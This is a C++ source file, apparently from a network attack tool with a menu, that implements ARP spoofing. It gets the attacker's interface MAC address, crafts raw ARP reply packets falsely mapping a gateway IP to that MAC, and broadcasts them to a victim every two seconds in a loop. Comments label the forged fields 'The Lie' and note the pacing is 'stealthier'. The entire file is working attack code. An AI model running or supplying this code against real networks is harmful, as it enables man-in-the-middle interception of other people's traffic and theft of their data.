#include "../headers/arp.h"

// Function to get the MAC address of the attacker's network interface
void ARP::get_mac_address(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    } else {
        perror("Failed to get MAC address");
        exit(1);
    }

    close(fd);
}

// Function to send an ARP spoofing packet
void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* spoof_ip) {
    // 1. Socket Creation
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed");
        return; // Don't exit(1), just return so the main menu stays alive
    }

    // 2. Get Mac
    uint8_t attacker_mac[6];
    get_mac_address(iface, attacker_mac);

    // 3. Prepare Packet
    uint8_t packet[42]; 
    struct ethhdr* eth = (struct ethhdr*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));

    // Ethernet Header (Broadcast)
    // Note: Broadcasting is "loud", but easiest for a demo.
    memset(eth->h_dest, 0xff, 6); 
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // ARP Header
    arp->htype = htons(1);      // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(2);       // ARP Reply (The "Lie")

    memcpy(arp->sha, attacker_mac, 6);          // Sender MAC: US (The Lie)
    inet_pton(AF_INET, spoof_ip, arp->spa);     // Sender IP: GATEWAY (The Lie)
    
    memset(arp->tha, 0xff, 6);                  // Target MAC: Broadcast (or 00)
    inet_pton(AF_INET, target_ip, arp->tpa);    // Target IP: VICTIM

    // Socket Address
    sockaddr_ll device = {};
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, eth->h_dest, 6);

    std::cout << "[+] ARP Spoofing started in background..." << std::endl;
    
    // 4. The Loop (Controlled by flag)
    this->attacking = true;
    while (this->attacking) {
        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&device, sizeof(device)) < 0) {
            perror("[-] Failed to send ARP packet");
        }
        // Sleep for 2 seconds to avoid flooding too hard (stealthier)
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    std::cout << "\n[!] ARP Spoofing stopped." << std::endl;
    close(sock);
}